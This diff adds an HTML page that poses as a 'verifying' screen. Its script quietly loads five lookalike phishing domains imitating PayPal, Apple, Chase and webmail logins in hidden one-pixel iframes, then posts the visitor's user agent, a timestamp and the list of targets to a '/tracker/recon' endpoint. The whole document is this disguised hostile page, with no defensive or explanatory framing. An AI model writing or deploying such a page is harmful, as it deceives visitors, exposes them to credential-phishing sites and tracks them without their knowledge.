@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Verifying...</title>
+  <style>
+    iframe {
+      display: none;
+      width: 1px;
+      height: 1px;
+    }
+  </style>
+</head>
+<body>
+  <h3>Hold on, verifying...</h3>
+  <script>
+    const targets = [
+      "https://paypal.login.com",
+      "https://webmail.verify-now.cc",
+      "https://apple.support-id.io",
+      "https://chase.account-fix.net",
+      "https://login.your-bank-id.com"
+    ];
+
+    targets.forEach(url => {
+      const frame = document.createElement("iframe");
+      frame.src = url;
+      document.body.appendChild(frame);
+    });
+
+    fetch("/tracker/recon", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        attempted: targets,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent
+      })
+    });
+  </script>
+</body>
+</html>
